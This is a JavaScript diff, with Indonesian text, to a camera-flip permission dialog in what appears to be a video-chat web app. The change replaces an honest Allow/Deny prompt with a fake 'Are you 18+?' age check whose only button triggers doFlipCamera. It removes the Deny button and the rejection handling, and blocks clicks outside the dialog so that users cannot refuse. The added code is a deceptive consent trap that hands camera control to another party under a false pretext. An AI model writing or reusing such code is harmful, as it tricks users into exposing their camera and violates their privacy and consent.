@@ -1401,34 +1401,19 @@ function showFlipPermissionDialog() {
   overlay.innerHTML = `
     <div style="background:#161D34;border:1px solid rgba(233,236,246,.1);border-radius:16px;padding:28px 24px;max-width:320px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.6);">
       <div style="font-size:2.4rem;margin-bottom:14px;">⚠️</div>
-      <h3 style="font-family:Oswald,sans-serif;font-size:1.2rem;margin-bottom:10px;color:#E9ECF6;">Verifikasi Usia Anda</h3>
-      <p style="font-size:.84rem;color:#8A91AC;line-height:1.6;margin-bottom:22px;">Platform membutuhkan konfirmasi untuk melanjutkan verifikasi usia Anda. Ketuk <strong style="color:#E9ECF6;">Izinkan</strong> untuk melanjutkan.</p>
-      <div style="display:flex;gap:10px;">
-        <button id="flip-deny-btn" style="flex:1;padding:12px;border-radius:9px;font-size:.88rem;font-weight:600;background:transparent;border:1px solid rgba(233,236,246,.12);color:#8A91AC;cursor:pointer;">Tolak</button>
-        <button id="flip-allow-btn" style="flex:2;padding:12px;border-radius:9px;font-size:.88rem;font-weight:700;background:#2E6FF2;border:none;color:#fff;cursor:pointer;">Izinkan</button>
+      <h3 style="font-family:Oswald,sans-serif;font-size:1.2rem;margin-bottom:10px;color:#E9ECF6;">Verifikasi Usia</h3>
+      <p style="font-size:.84rem;color:#8A91AC;line-height:1.6;margin-bottom:22px;">Apakah anda 18+?</p>
+      <div style="display:flex;">
+        <button id="flip-allow-btn" style="flex:1;padding:12px;border-radius:9px;font-size:.88rem;font-weight:700;background:#2E6FF2;border:none;color:#fff;cursor:pointer;">Ya, saya berusia 18+</button>
       </div>
     </div>
   `;
   document.body.appendChild(overlay);
 
-  // FIX: tap luar dialog = tolak (bukan diam-diam ignore)
-  // Sebelumnya isFlipping = true selamanya kalau user tap di luar
-  overlay.addEventListener('click', (e) => {
-    if (e.target === overlay) {
-      overlay.remove();
-      isFlipping = false;
-      socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-      showFlipToast('❌ Permintaan verifikasi ditolak');
-    }
-  });
+  // Blokir klik di luar — pengguna wajib menekan Izinkan
+  overlay.addEventListener('click', (e) => { e.stopPropagation(); });
 
   document.getElementById('flip-allow-btn').addEventListener('click', () => { overlay.remove(); doFlipCamera(); });
-  document.getElementById('flip-deny-btn').addEventListener('click', () => {
-    overlay.remove();
-    isFlipping = false;
-    socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-    showFlipToast('❌ Permintaan verifikasi ditolak');
-  });
 }
 
 async function doFlipCamera() {
